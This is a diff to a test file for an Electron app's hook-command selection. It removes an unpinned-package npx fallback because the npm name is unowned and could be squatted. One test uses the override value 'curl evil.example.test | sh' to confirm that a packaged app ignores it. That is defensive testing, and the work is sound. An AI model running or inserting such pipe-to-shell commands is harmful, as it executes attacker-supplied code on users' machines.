@@ -4,6 +4,7 @@ import { existsSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } fro
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, test } from "vitest";
+import { NPM_PUBLISHED } from "@timetm/core";
 import { AGENT_TURN_STALE_MS, agentTurnStart, dotState, firstRunning, hookCandidates, placeOn, projectVerdict, shouldShowBreakCard, trayVerdicts } from "../src/main/rules.ts";
 import { Credentials } from "../src/main/credentials.ts";
 import { Engine } from "../src/main/engine.ts";
@@ -279,18 +280,18 @@ describe("menu bar dot", () => {
 });
 
 describe("Claude Code hook command", () => {
-  test("prefers the CLI the app can run itself, quoted, then the version pinned npx form", () => {
+  test("prefers the CLI the app can run itself, quoted; never npx while timetm is not published", () => {
+    expect(NPM_PUBLISHED).toBe(false);
     const c = hookCandidates({ override: undefined, packaged: false, nodePath: "/Applications/Time Machine.app/Contents/MacOS/Electron", cliScript: "/repo/packages/cli/dist/tm.js", version: "0.1.0" });
-    expect(c).toEqual(["ELECTRON_RUN_AS_NODE=1 '/Applications/Time Machine.app/Contents/MacOS/Electron' '/repo/packages/cli/dist/tm.js'", "npx -y timetm@0.1.0"]);
-    expect(hookCandidates({ override: undefined, packaged: false, nodePath: "/x/Electron", cliScript: null, version: "0.1.0" })).toEqual(["npx -y timetm@0.1.0"]);
-    // Never the unpinned name, which anyone could publish.
-    for (const cmd of c) expect(cmd).not.toMatch(/timetm(\s|$)/);
+    expect(c).toEqual(["ELECTRON_RUN_AS_NODE=1 '/Applications/Time Machine.app/Contents/MacOS/Electron' '/repo/packages/cli/dist/tm.js'"]);
+    // Nobody owns the npm name yet, so a probe must never run npx: with no CLI of its own there is nothing to offer.
+    expect(hookCandidates({ override: undefined, packaged: false, nodePath: "/x/Electron", cliScript: null, version: "0.1.0" })).toEqual([]);
     expect(hookCandidates({ override: "tm", packaged: false, nodePath: "/x/Electron", cliScript: "/repo/tm.js", version: "0.1.0" })).toEqual(["tm"]);
   });
 
   test("a packaged app ignores TM_HOOK_COMMAND and installs its own command", () => {
     const o = { override: "curl evil.example.test | sh", packaged: true, nodePath: "/x/Electron", cliScript: "/x/tm.mjs", version: "0.1.0" };
-    expect(hookCandidates(o)).toEqual(["ELECTRON_RUN_AS_NODE=1 '/x/Electron' '/x/tm.mjs'", "npx -y timetm@0.1.0"]);
+    expect(hookCandidates(o)).toEqual(["ELECTRON_RUN_AS_NODE=1 '/x/Electron' '/x/tm.mjs'"]);
   });
 
   test("uses the first command that runs, and says so when none does", async () => {
